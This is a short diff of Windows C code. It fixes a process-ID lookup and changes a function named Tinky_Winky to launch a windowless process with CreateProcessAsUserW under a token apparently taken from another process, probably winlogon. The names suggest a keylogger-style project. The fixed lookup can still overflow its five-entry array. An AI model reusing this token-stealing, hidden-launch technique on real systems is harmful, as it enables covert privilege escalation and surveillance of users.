@@ -174,7 +174,7 @@ DWORD GetPidByName(char* filename)
 {
     HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
     PROCESSENTRY32 pEntry;
-    PROCESSENTRY32 ptemp[];
+    PROCESSENTRY32 ptemp[5];
     pEntry.dwSize = sizeof(PROCESSENTRY32);
     BOOL hRes = Process32First(hSnapShot, &pEntry);
     int i = 0;
@@ -183,12 +183,13 @@ DWORD GetPidByName(char* filename)
         if (strcmp(pEntry.szExeFile, filename) == 0)
         {
             ptemp[i] = pEntry;
+            i++;
             //CloseHandle(hSnapShot);
         }
         hRes = Process32Next(hSnapShot, &pEntry);
     }
     CloseHandle(hSnapShot);
-    return(ptemp[1].th32ProcessID);
+    return(ptemp[0].th32ProcessID);
     //return(0);
 }
 
@@ -209,7 +210,10 @@ void    Tinky_Winky() {
     }
     CloseHandle(wlTH);
 
-    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
+    /*if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
+        printf("cpwt (%ld)\n", GetLastError());
+    }*/
+    if (!CreateProcessAsUserW(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
         printf("cpwt (%ld)\n", GetLastError());
     }
 }
